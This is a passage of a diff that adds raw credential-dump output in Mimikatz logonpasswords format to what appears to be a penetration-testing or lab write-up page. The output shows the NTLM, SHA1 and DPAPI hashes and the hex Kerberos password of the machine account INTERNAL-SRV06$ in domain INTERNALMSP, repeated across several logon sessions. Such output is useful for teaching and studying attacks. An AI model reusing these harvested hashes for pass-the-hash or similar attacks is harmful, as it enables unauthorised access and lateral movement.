+	msv :	
+	 [00000003] Primary
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : INTERNALMSP
+	 * NTLM     : 5af2df4ec639a926171e4b2b301e59b0
+	 * SHA1     : 0fbb09b833d6518ae27558d43ab806581862ec3f
+	 * DPAPI    : 0fbb09b833d6518ae27558d43ab80658
+	tspkg :	
+	wdigest :	
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : INTERNALMSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : internal.msp.local
+	 * Password : 5e 7c f4 7f 62 66 a0 eb 04 7a 10 fe 1d 6d 37 ec 05 39 41 8b 3b f7 04 3b 0f 3e eb 4c ec 8e 22 7e e
+f ee ed e3 ce 1b a0 d4 35 c8 fd 04 c3 cc dc 09 e2 a8 dd 4f 29 c0 66 c9 48 ee 0b d8 5d c8 00 73 b4 21 fb db 57 de db 42 
+2f 94 a0 61 5d 2c 6c ed 8c 85 4e b8 cf 26 c4 16 6b 71 f5 73 6c 09 68 d8 f3 19 b7 b2 a3 37 b3 5b 7f bd 25 6f 77 d7 76 c6
+ 2d f9 29 9c 6d 8b bd 84 5b 6d d7 98 be a5 bf b9 07 50 8d 85 58 fb 44 89 09 70 48 88 58 14 ba a8 95 f7 38 50 4c c0 0a d
+1 5e 22 1d da c4 ba 44 e2 f1 3b 89 95 77 05 5a 5c 7a ba 08 4e 09 6f 3f 58 9f 3e 91 d3 3a 91 23 38 c3 8a ee a8 b6 84 65 
+55 94 39 f1 01 09 4d eb 6d 21 be a2 a7 e4 c9 63 35 7a c7 ef 19 2d b0 7d a6 2d 1f f9 30 76 a7 b1 dc c2 81 34 72 81 0f a4
+ 16 ce 75 43 1d e2 c9 ba e4 
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 59795 (00000000:0000e993)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:02:32 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : INTERNALMSP
+	 * NTLM     : 5af2df4ec639a926171e4b2b301e59b0
+	 * SHA1     : 0fbb09b833d6518ae27558d43ab806581862ec3f
+	 * DPAPI    : 0fbb09b833d6518ae27558d43ab80658
+	tspkg :	
+	wdigest :	
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : INTERNALMSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : internal.msp.local
+	 * Password : 5e 7c f4 7f 62 66 a0 eb 04 7a 10 fe 1d 6d 37 ec 05 39 41 8b 3b f7 04 3b 0f 3e eb 4c ec 8e 22 7e e
+f ee ed e3 ce 1b a0 d4 35 c8 fd 04 c3 cc dc 09 e2 a8 dd 4f 29 c0 66 c9 48 ee 0b d8 5d c8 00 73 b4 21 fb db 57 de db 42 
+2f 94 a0 61 5d 2c 6c ed 8c 85 4e b8 cf 26 c4 16 6b 71 f5 73 6c 09 68 d8 f3 19 b7 b2 a3 37 b3 5b 7f bd 25 6f 77 d7 76 c6
+ 2d f9 29 9c 6d 8b bd 84 5b 6d d7 98 be a5 bf b9 07 50 8d 85 58 fb 44 89 09 70 48 88 58 14 ba a8 95 f7 38 50 4c c0 0a d
+1 5e 22 1d da c4 ba 44 e2 f1 3b 89 95 77 05 5a 5c 7a ba 08 4e 09 6f 3f 58 9f 3e 91 d3 3a 91 23 38 c3 8a ee a8 b6 84 65 
+55 94 39 f1 01 09 4d eb 6d 21 be a2 a7 e4 c9 63 35 7a c7 ef 19 2d b0 7d a6 2d 1f f9 30 76 a7 b1 dc c2 81 34 72 81 0f a4
+ 16 ce 75 43 1d e2 c9 ba e4 
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 58223 (00000000:0000e36f)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:02:31 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : INTERNALMSP
+	 * NTLM     : 5af2df4ec639a926171e4b2b301e59b0
+	 * SHA1     : 0fbb09b833d6518ae27558d43ab806581862ec3f
+	 * DPAPI    : 0fbb09b833d6518ae27558d43ab80658
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+ 
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : INTERNAL-SRV06$
+Domain            : INTERNALMSP
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:02:31 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : INTERNAL-SRV06$
+	 * Domain   : INTERNALMSP
+	 * Password : (null)
+	kerberos :	
+	 * Username : internal-srv06$
+	 * Domain   : INTERNAL.MSP.LOCAL
+	 * Password : 5e 7c f4 7f 62 66 a0 eb 04 7a 10 fe 1d 6d 37 ec 05 39 41 8b 3b f7 04 3b 0f 3e eb 4c ec 8e 22 7e e
+f ee ed e3 ce 1b a0 d4 35 c8 fd 04 c3 cc dc 09 e2 a8 dd 4f 29 c0 66 c9 48 ee 0b d8 5d c8 00 73 b4 21 fb db 57 de db 42 
+2f 94 a0 61 5d 2c 6c ed 8c 85 4e b8 cf 26 c4 16 6b 71 f5 73 6c 09 68 d8 f3 19 b7 b2 a3 37 b3 5b 7f bd 25 6f 77 d7 76 c6
+ 2d f9 29 9c 6d 8b bd 84 5b 6d d7 98 be a5 bf b9 07 50 8d 85 58 fb 44 89 09 70 48 88 58 14 ba a8 95 f7 38 50 4c c0 0a d
+1 5e 22 1d da c4 ba 44 e2 f1 3b 89 95 77 05 5a 5c 7a ba 08 4e 09 6f 3f 58 9f 3e 91 d3 3a 91 23 38 c3 8a ee a8 b6 84 65 
+55 94 39 f1 01 09 4d eb 6d 21 be a2 a7 e4 c9 63 35 7a c7 ef 19 2d b0 7d a6 2d 1f f9 30 76 a7 b1 dc c2 81 34 72 81 0f a4
+ 16 ce 75 43 1d e2 c9 ba e4 
+	ssp :	
+	credman :	</code></pre></div></details></li></ul></div></details></li></body></html>
         </section>
-      </article>
-    </div>
-  </main>
-
-  <script src="../../assets/js/script.js"></script>
-  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
-  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
-</body>
-</html>
